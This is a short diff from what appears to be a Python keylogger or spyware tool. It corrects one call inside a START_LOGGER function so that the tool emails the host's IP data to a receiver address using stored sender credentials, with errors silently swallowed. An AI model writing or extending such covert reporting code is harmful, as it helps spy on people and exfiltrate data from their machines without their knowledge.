@@ -203,7 +203,7 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):
         if Email_mode == True:
             try:
                 host_Data = get_ip_address(None)
-                email(f"Started Process || {host_Data}")
+                email(senderEmail,senderPassword,receiverEmail,"message",message=f"Started Process || {host_Data}")
             except Exception as e:
                     pass
                 
